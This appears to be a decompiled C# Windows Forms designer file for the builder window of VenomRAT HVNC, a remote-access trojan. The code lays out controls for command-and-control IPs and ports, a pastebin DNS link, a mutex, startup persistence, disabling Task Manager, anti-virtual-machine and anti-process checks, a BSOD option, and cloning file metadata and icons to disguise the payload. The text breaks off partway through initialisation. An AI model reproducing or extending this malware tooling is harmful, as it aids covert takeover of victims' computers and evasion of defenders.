namespace VenomRAT_HVNC.Server.Forms
{
	// Token: 0x0200007A RID: 122
	public partial class FormBuilder : global::System.Windows.Forms.Form
	{
		// Token: 0x06000485 RID: 1157 RVA: 0x0002D0A0 File Offset: 0x0002D0A0
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000486 RID: 1158 RVA: 0x0002D0C0 File Offset: 0x0002D0C0
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(global::VenomRAT_HVNC.Server.Forms.FormBuilder));
			this.directoryEntry1 = new global::System.DirectoryServices.DirectoryEntry();
			this.toolTip1 = new global::System.Windows.Forms.ToolTip(this.components);
			this.label3 = new global::System.Windows.Forms.Label();
			this.label4 = new global::System.Windows.Forms.Label();
			this.picIcon = new global::System.Windows.Forms.PictureBox();
			this.label14 = new global::System.Windows.Forms.Label();
			this.label13 = new global::System.Windows.Forms.Label();
			this.label12 = new global::System.Windows.Forms.Label();
			this.label11 = new global::System.Windows.Forms.Label();
			this.label10 = new global::System.Windows.Forms.Label();
			this.label9 = new global::System.Windows.Forms.Label();
			this.label7 = new global::System.Windows.Forms.Label();
			this.label8 = new global::System.Windows.Forms.Label();
			this.label6 = new global::System.Windows.Forms.Label();
			this.label15 = new global::System.Windows.Forms.Label();
			this.comboBoxFolder = new global::Guna.UI2.WinForms.Guna2ComboBox();
			this.label18 = new global::System.Windows.Forms.Label();
			this.label19 = new global::System.Windows.Forms.Label();
			this.numDelay = new global::Guna.UI2.WinForms.Guna2NumericUpDown();
			this.label16 = new global::System.Windows.Forms.Label();
			this.chkPaste_bin = new global::Guna.UI2.WinForms.Guna2CheckBox();
			this.YourListPorts = new global::System.Windows.Forms.ListBox();
			this.YourListIPs = new global::System.Windows.Forms.ListBox();
			this.guna2DragControl1 = new global::Guna.UI2.WinForms.Guna2DragControl(this.components);
			this.guna2ShadowPanel1 = new global::Guna.UI2.WinForms.Guna2ShadowPanel();
			this.btnBuild = new global::Guna.UI2.WinForms.Guna2Button();
			this.guna2Panel1 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			this.label1 = new global::System.Windows.Forms.Label();
			this.guna2TabControl1 = new global::Guna.UI2.WinForms.Guna2TabControl();
			this.tabPage1 = new global::System.Windows.Forms.TabPage();
			this.guna2ShadowPanel2 = new global::Guna.UI2.WinForms.Guna2ShadowPanel();
			this.textIP = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtPaste_bin = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.textPort = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.btnRemoveIP = new global::Guna.UI2.WinForms.Guna2Button();
			this.btnRemovePort = new global::Guna.UI2.WinForms.Guna2Button();
			this.btnAddIP = new global::Guna.UI2.WinForms.Guna2Button();
			this.btnAddPort = new global::Guna.UI2.WinForms.Guna2Button();
			this.tabPage2 = new global::System.Windows.Forms.TabPage();
			this.guna2ShadowPanel4 = new global::Guna.UI2.WinForms.Guna2ShadowPanel();
			this.textFilename = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.chkAnti = new global::Guna.UI2.WinForms.Guna2CustomCheckBox();
			this.chkAntiProcess = new global::Guna.UI2.WinForms.Guna2CustomCheckBox();
			this.checkBox1 = new global::Guna.UI2.WinForms.Guna2CustomCheckBox();
			this.tabPage3 = new global::System.Windows.Forms.TabPage();
			this.guna2ShadowPanel3 = new global::Guna.UI2.WinForms.Guna2ShadowPanel();
			this.txtIcon = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtProductVersion = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtFileVersion = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtTrademarks = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtCompany = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtDescription = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtProduct = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtCopyright = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtOriginalFilename = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.btnAssembly = new global::Guna.UI2.WinForms.Guna2CustomCheckBox();
			this.chkIcon = new global::Guna.UI2.WinForms.Guna2CustomCheckBox();
			this.btnClone = new global::Guna.UI2.WinForms.Guna2Button();
			this.btnIcon = new global::Guna.UI2.WinForms.Guna2Button();
			this.chkBsod = new global::System.Windows.Forms.CheckBox();
			this.guna2DragControl2 = new global::Guna.UI2.WinForms.Guna2DragControl(this.components);
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.txtGroup = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.txtMutex = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.label17 = new global::System.Windows.Forms.Label();
			this.label5 = new global::System.Windows.Forms.Label();
			((global::System.ComponentModel.ISupportInitialize)this.picIcon).BeginInit();
			((global::System.ComponentModel.ISupportInitialize)this.numDelay).BeginInit();
			this.guna2ShadowPanel1.SuspendLayout();
			this.guna2Panel1.SuspendLayout();
			this.guna2TabControl1.SuspendLayout();
			this.tabPage1.SuspendLayout();
			this.guna2ShadowPanel2.SuspendLayout();
			this.tabPage2.SuspendLayout();
			this.guna2ShadowPanel4.SuspendLayout();
			this.tabPage3.SuspendLayout();
			this.guna2ShadowPanel3.SuspendLayout();
			base.SuspendLayout();
			this.label3.AutoSize = true;
			this.label3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label3.ForeColor = global::System.Drawing.Color.White;
			this.label3.Location = new global::System.Drawing.Point(221, 203);
			this.label3.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(59, 16);
			this.label3.TabIndex = 97;
			this.label3.Text = "File path";
			this.label4.AutoSize = true;
			this.label4.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label4.ForeColor = global::System.Drawing.Color.White;
			this.label4.Location = new global::System.Drawing.Point(221, 153);
			this.label4.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label4.Name = "label4";
			this.label4.Size = new global::System.Drawing.Size(67, 16);
			this.label4.TabIndex = 98;
			this.label4.Text = "File name";
			this.picIcon.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.picIcon.ErrorImage = null;
			this.picIcon.InitialImage = null;
			this.picIcon.Location = new global::System.Drawing.Point(550, 151);
			this.picIcon.Margin = new global::System.Windows.Forms.Padding(2);
			this.picIcon.Name = "picIcon";
			this.picIcon.Size = new global::System.Drawing.Size(87, 70);
			this.picIcon.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.picIcon.TabIndex = 91;
			this.picIcon.TabStop = false;
			this.label14.AutoSize = true;
			this.label14.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label14.ForeColor = global::System.Drawing.Color.White;
			this.label14.Location = new global::System.Drawing.Point(110, 307);
			this.label14.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label14.Name = "label14";
			this.label14.Size = new global::System.Drawing.Size(106, 16);
			this.label14.TabIndex = 82;
			this.label14.Text = "Product Version:";
			this.label13.AutoSize = true;
			this.label13.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label13.ForeColor = global::System.Drawing.Color.White;
			this.label13.Location = new global::System.Drawing.Point(110, 339);
			this.label13.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label13.Name = "label13";
			this.label13.Size = new global::System.Drawing.Size(82, 16);
			this.label13.TabIndex = 81;
			this.label13.Text = "File Version:";
			this.label12.AutoSize = true;
			this.label12.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label12.ForeColor = global::System.Drawing.Color.White;
			this.label12.Location = new global::System.Drawing.Point(110, 275);
			this.label12.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label12.Name = "label12";
			this.label12.Size = new global::System.Drawing.Size(116, 16);
			this.label12.TabIndex = 80;
			this.label12.Text = "Original Filename:";
			this.label11.AutoSize = true;
			this.label11.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label11.ForeColor = global::System.Drawing.Color.White;
			this.label11.Location = new global::System.Drawing.Point(110, 243);
			this.label11.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label11.Name = "label11";
			this.label11.Size = new global::System.Drawing.Size(85, 16);
			this.label11.TabIndex = 79;
			this.label11.Text = "Trademarks:";
			this.label10.AutoSize = true;
			this.label10.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label10.ForeColor = global::System.Drawing.Color.White;
			this.label10.Location = new global::System.Drawing.Point(110, 211);
			this.label10.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label10.Name = "label10";
			this.label10.Size = new global::System.Drawing.Size(68, 16);
			this.label10.TabIndex = 78;
			this.label10.Text = "Copyright:";
			this.label9.AutoSize = true;
			this.label9.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label9.ForeColor = global::System.Drawing.Color.White;
			this.label9.Location = new global::System.Drawing.Point(110, 179);
			this.label9.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label9.Name = "label9";
			this.label9.Size = new global::System.Drawing.Size(69, 16);
			this.label9.TabIndex = 77;
			this.label9.Text = "Company:";
			this.label7.AutoSize = true;
			this.label7.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label7.ForeColor = global::System.Drawing.Color.White;
			this.label7.Location = new global::System.Drawing.Point(110, 147);
			this.label7.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label7.Name = "label7";
			this.label7.Size = new global::System.Drawing.Size(79, 16);
			this.label7.TabIndex = 75;
			this.label7.Text = "Description:";
			this.label8.AutoSize = true;
			this.label8.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label8.ForeColor = global::System.Drawing.Color.White;
			this.label8.Location = new global::System.Drawing.Point(110, 115);
			this.label8.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label8.Name = "label8";
			this.label8.Size = new global::System.Drawing.Size(57, 16);
			this.label8.TabIndex = 73;
			this.label8.Text = "Product:";
			this.label6.AutoSize = true;
			this.label6.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label6.ForeColor = global::System.Drawing.Color.White;
			this.label6.Location = new global::System.Drawing.Point(255, 117);
			this.label6.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label6.Name = "label6";
			this.label6.Size = new global::System.Drawing.Size(57, 16);
			this.label6.TabIndex = 81;
			this.label6.Text = "Start UP";
			this.label15.AutoSize = true;
			this.label15.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label15.ForeColor = global::System.Drawing.Color.White;
			this.label15.Location = new global::System.Drawing.Point(141, 61);
			this.label15.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label15.Name = "label15";
			this.label15.Size = new global::System.Drawing.Size(68, 16);
			this.label15.TabIndex = 81;
			this.label15.Text = "Assembly";
			this.comboBoxFolder.BackColor = global::System.Drawing.Color.Transparent;
			this.comboBoxFolder.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.comboBoxFolder.DrawMode = global::System.Windows.Forms.DrawMode.OwnerDrawFixed;
			this.comboBoxFolder.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
			this.comboBoxFolder.Enabled = false;
			this.comboBoxFolder.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.comboBoxFolder.FocusedColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.comboBoxFolder.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.comboBoxFolder.FocusedState.Parent = this.comboBoxFolder;
			this.comboBoxFolder.Font = new global::System.Drawing.Font("Segoe UI", 10f);
			this.comboBoxFolder.ForeColor = global::System.Drawing.Color.FromArgb(68, 88, 112);
			this.comboBoxFolder.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.comboBoxFolder.HoverState.Parent = this.comboBoxFolder;
			this.comboBoxFolder.ItemHeight = 30;
			this.comboBoxFolder.Items.AddRange(new object[] { "%AppData%", "%Temp%" });
			this.comboBoxFolder.ItemsAppearance.Parent = this.comboBoxFolder;
			this.comboBoxFolder.Location = new global::System.Drawing.Point(407, 190);
			this.comboBoxFolder.Name = "comboBoxFolder";
			this.comboBoxFolder.ShadowDecoration.Parent = this.comboBoxFolder;
			this.comboBoxFolder.Size = new global::System.Drawing.Size(190, 36);
			this.comboBoxFolder.TabIndex = 120;
			this.label18.AutoSize = true;
			this.label18.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label18.ForeColor = global::System.Drawing.Color.White;
			this.label18.Location = new global::System.Drawing.Point(451, 255);
			this.label18.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label18.Name = "label18";
			this.label18.Size = new global::System.Drawing.Size(146, 16);
			this.label18.TabIndex = 81;
			this.label18.Text = "Disable Task Manager";
			this.label19.AutoSize = true;
			this.label19.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label19.ForeColor = global::System.Drawing.Color.White;
			this.label19.Location = new global::System.Drawing.Point(250, 254);
			this.label19.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label19.Name = "label19";
			this.label19.Size = new global::System.Drawing.Size(125, 16);
			this.label19.TabIndex = 81;
			this.label19.Text = "Anti-Virtual Machine";
			this.numDelay.BackColor = global::System.Drawing.Color.Transparent;
			this.numDelay.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.numDelay.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.numDelay.DisabledState.Parent = this.numDelay;
			this.numDelay.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.numDelay.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.numDelay.FocusedState.Parent = this.numDelay;
			this.numDelay.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.numDelay.ForeColor = global::System.Drawing.Color.Black;
			this.numDelay.Location = new global::System.Drawing.Point(518, 116);
			this.numDelay.Name = "numDelay";
			this.numDelay.ShadowDecoration.Parent = this.numDelay;
			this.numDelay.Size = new global::System.Drawing.Size(79, 27);
			this.numDelay.TabIndex = 121;
			this.numDelay.UpDownButtonFillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.numDelay.UpDownButtonForeColor = global::System.Drawing.Color.White;
			this.label16.AutoSize = true;
			this.label16.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label16.ForeColor = global::System.Drawing.Color.White;
			this.label16.Location = new global::System.Drawing.Point(404, 121);
			this.label16.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label16.Name = "label16";
			this.label16.Size = new global::System.Drawing.Size(78, 16);
			this.label16.TabIndex = 73;
			this.label16.Text = "Time Delay";
			this.chkPaste_bin.AutoSize = true;
			this.chkPaste_bin.BackColor = global::System.Drawing.Color.Transparent;
			this.chkPaste_bin.CheckedState.BorderColor = global::System.Drawing.Color.FromArgb(0, 150, 106);
			this.chkPaste_bin.CheckedState.BorderRadius = 1;
			this.chkPaste_bin.CheckedState.BorderThickness = 0;
			this.chkPaste_bin.CheckedState.FillColor = global::System.Drawing.Color.FromArgb(0, 150, 106);
			this.chkPaste_bin.CheckMarkColor = global::System.Drawing.Color.Black;
			this.chkPaste_bin.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f);
			this.chkPaste_bin.ForeColor = global::System.Drawing.Color.White;
			this.chkPaste_bin.Location = new global::System.Drawing.Point(144, 269);
			this.chkPaste_bin.Name = "chkPaste_bin";
			this.chkPaste_bin.Size = new global::System.Drawing.Size(146, 19);
			this.chkPaste_bin.TabIndex = 122;
			this.chkPaste_bin.Text = "Add Your DNS By Link";
			this.chkPaste_bin.UncheckedState.BorderColor = global::System.Drawing.Color.White;
			this.chkPaste_bin.UncheckedState.BorderRadius = 0;
			this.chkPaste_bin.UncheckedState.BorderThickness = 0;
			this.chkPaste_bin.UncheckedState.FillColor = global::System.Drawing.Color.White;
			this.chkPaste_bin.UseVisualStyleBackColor = false;
			this.chkPaste_bin.CheckedChanged += new global::System.EventHandler(this.CheckBox2_CheckedChanged);
			this.YourListPorts.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.YourListPorts.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.YourListPorts.FormattingEnabled = true;
			this.YourListPorts.Location = new global::System.Drawing.Point(514, 142);
			this.YourListPorts.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 2);
			this.YourListPorts.Name = "YourListPorts";
			this.YourListPorts.Size = new global::System.Drawing.Size(227, 30);
			this.YourListPorts.TabIndex = 65;
			this.YourListIPs.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.YourListIPs.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.YourListIPs.FormattingEnabled = true;
			this.YourListIPs.Location = new global::System.Drawing.Point(144, 142);
			this.YourListIPs.Margin = new global::System.Windows.Forms.Padding(2);
			this.YourListIPs.Name = "YourListIPs";
			this.YourListIPs.Size = new global::System.Drawing.Size(227, 30);
			this.YourListIPs.TabIndex = 70;
			this.guna2ShadowPanel1.BackColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2ShadowPanel1.Controls.Add(this.btnBuild);
			this.guna2ShadowPanel1.Controls.Add(this.guna2Panel1);
			this.guna2ShadowPanel1.Controls.Add(this.guna2TabControl1);
			this.guna2ShadowPanel1.Cursor = global::System.Windows.Forms.Cursors.AppStarting;
			this.guna2ShadowPanel1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.guna2ShadowPanel1.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.guna2ShadowPanel1.ForeColor = global::System.Drawing.Color.Transparent;
			this.guna2ShadowPanel1.Location = new global::System.Drawing.Point(0, 0);
			this.guna2ShadowPanel1.Name = "guna2ShadowPanel1";
			this.guna2ShadowPanel1.ShadowColor = global::System.Drawing.Color.Lime;
			this.guna2ShadowPanel1.ShadowDepth = 8;
			this.guna2ShadowPanel1.ShadowShift = 2;
			this.guna2ShadowPanel1.Size = new global::System.Drawing.Size(1000, 658);
			this.guna2ShadowPanel1.TabIndex = 125;
			this.guna2ShadowPanel1.Paint += new global::System.Windows.Forms.PaintEventHandler(this.guna2ShadowPanel1_Paint);
			this.btnBuild.Animated = true;
			this.btnBuild.BorderColor = global::System.Drawing.Color.Maroon;
			this.btnBuild.BorderRadius = 5;
			this.btnBuild.CheckedState.Parent = this.btnBuild;
			this.btnBuild.CustomImages.Parent = this.btnBuild;
			this.btnBuild.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.btnBuild.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.btnBuild.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.btnBuild.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.btnBuild.DisabledState.Parent = this.btnBuild;
			this.btnBuild.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.btnBuild.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.btnBuild.ForeColor = global::System.Drawing.Color.White;
			this.btnBuild.HoverState.Parent = this.btnBuild;
			this.btnBuild.Location = new global::System.Drawing.Point(24, 600);
			this.btnBuild.Name = "btnBuild";
			this.btnBuild.ShadowDecoration.Parent = this.btnBuild;
			this.btnBuild.Size = new global::System.Drawing.Size(956, 46);
			this.btnBuild.TabIndex = 125;
			this.btnBuild.Text = "Build";
			this.btnBuild.Click += new global::System.EventHandler(this.BtnBuild_Click);
			this.guna2Panel1.BackColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2Panel1.Controls.Add(this.guna2ControlBox1);
			this.guna2Panel1.Controls.Add(this.label1);
			this.guna2Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.guna2Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.guna2Panel1.Name = "guna2Panel1";
			this.guna2Panel1.ShadowDecoration.Parent = this.guna2Panel1;
			this.guna2Panel1.Size = new global::System.Drawing.Size(1000, 43);
			this.guna2Panel1.TabIndex = 124;
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(943, 5);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(45, 29);
			this.guna2ControlBox1.TabIndex = 1;
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.Location = new global::System.Drawing.Point(418, 12);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(113, 20);
			this.label1.TabIndex = 0;
			this.label1.Text = "Venom Builder";
			this.guna2TabControl1.Controls.Add(this.tabPage1);
			this.guna2TabControl1.Controls.Add(this.tabPage2);
			this.guna2TabControl1.Controls.Add(this.tabPage3);
			this.guna2TabControl1.ItemSize = new global::System.Drawing.Size(180, 40);
			this.guna2TabControl1.Location = new global::System.Drawing.Point(20, 62);
			this.guna2TabControl1.Name = "guna2TabControl1";
			this.guna2TabControl1.SelectedIndex = 0;
			this.guna2TabControl1.Size = new global::System.Drawing.Size(960, 531);
			this.guna2TabControl1.TabButtonHoverState.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2TabControl1.TabButtonHoverState.FillColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.guna2TabControl1.TabButtonHoverState.Font = new global::System.Drawing.Font("Segoe UI Semibold", 10f);
			this.guna2TabControl1.TabButtonHoverState.ForeColor = global::System.Drawing.Color.White;
			this.guna2TabControl1.TabButtonHoverState.InnerColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.guna2TabControl1.TabButtonIdleState.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2TabControl1.TabButtonIdleState.FillColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.guna2TabControl1.TabButtonIdleState.Font = new global::System.Drawing.Font("Segoe UI Semibold", 10f);
			this.guna2TabControl1.TabButtonIdleState.ForeColor = global::System.Drawing.Color.FromArgb(156, 160, 167);
			this.guna2TabControl1.TabButtonIdleState.InnerColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.guna2TabControl1.TabButtonSelectedState.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2TabControl1.TabButtonSelectedState.FillColor = global::System.Drawing.Color.FromArgb(29, 29, 29);
			this.guna2TabControl1.TabButtonSelectedState.Font = new global::System.Drawing.Font("Segoe UI Semibold", 10f);
			this.guna2TabControl1.TabButtonSelectedState.ForeColor = global::System.Drawing.Color.White;
			this.guna2TabControl1.TabButtonSelectedState.InnerColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2TabControl1.TabButtonSize = new global::System.Drawing.Size(180, 40);
			this.guna2TabControl1.TabIndex = 123;
			this.guna2TabControl1.TabMenuBackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.guna2TabControl1.TabMenuOrientation = global::Guna.UI2.WinForms.TabMenuOrientation.HorizontalTop;
			this.tabPage1.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.tabPage1.Controls.Add(this.guna2ShadowPanel2);
			this.tabPage1.Location = new global::System.Drawing.Point(4, 44);
			this.tabPage1.Name = "tabPage1";
			this.tabPage1.Padding = new global::System.Windows.Forms.Padding(3);
			this.tabPage1.Size = new global::System.Drawing.Size(952, 483);
			this.tabPage1.TabIndex = 0;
			this.tabPage1.Text = "IP/DNS";
			this.guna2ShadowPanel2.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ShadowPanel2.Controls.Add(this.txtGroup);
			this.guna2ShadowPanel2.Controls.Add(this.txtMutex);
			this.guna2ShadowPanel2.Controls.Add(this.label17);
			this.guna2ShadowPanel2.Controls.Add(this.label5);
			this.guna2ShadowPanel2.Controls.Add(this.textIP);
			this.guna2ShadowPanel2.Controls.Add(this.txtPaste_bin);
			this.guna2ShadowPanel2.Controls.Add(this.textPort);
			this.guna2ShadowPanel2.Controls.Add(this.btnRemoveIP);
			this.guna2ShadowPanel2.Controls.Add(this.btnRemovePort);
			this.guna2ShadowPanel2.Controls.Add(this.btnAddIP);
			this.guna2ShadowPanel2.Controls.Add(this.btnAddPort);
			this.guna2ShadowPanel2.Controls.Add(this.YourListPorts);
			this.guna2ShadowPanel2.Controls.Add(this.chkPaste_bin);
			this.guna2ShadowPanel2.Controls.Add(this.YourListIPs);
			this.guna2ShadowPanel2.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.guna2ShadowPanel2.Location = new global::System.Drawing.Point(37, 37);
			this.guna2ShadowPanel2.Name = "guna2ShadowPanel2";
			this.guna2ShadowPanel2.ShadowColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2ShadowPanel2.ShadowDepth = 200;
			this.guna2ShadowPanel2.ShadowShift = 7;
			this.guna2ShadowPanel2.Size = new global::System.Drawing.Size(879, 418);
			this.guna2ShadowPanel2.TabIndex = 123;
			this.guna2ShadowPanel2.Paint += new global::System.Windows.Forms.PaintEventHandler(this.guna2ShadowPanel2_Paint);
			this.textIP.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.textIP.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.textIP.DefaultText = "";
			this.textIP.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.textIP.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.textIP.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textIP.DisabledState.Parent = this.textIP;
			this.textIP.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textIP.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.textIP.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.textIP.FocusedState.Parent = this.textIP;
			this.textIP.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.textIP.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.textIP.HoverState.Parent = this.textIP;
			this.textIP.Location = new global::System.Drawing.Point(144, 101);
			this.textIP.Name = "textIP";
			this.textIP.PasswordChar = '\0';
			this.textIP.PlaceholderText = "";
			this.textIP.SelectedText = "";
			this.textIP.ShadowDecoration.Parent = this.textIP;
			this.textIP.Size = new global::System.Drawing.Size(227, 26);
			this.textIP.TabIndex = 126;
			this.txtPaste_bin.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtPaste_bin.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtPaste_bin.DefaultText = "DNS url";
			this.txtPaste_bin.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtPaste_bin.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtPaste_bin.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtPaste_bin.DisabledState.Parent = this.txtPaste_bin;
			this.txtPaste_bin.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
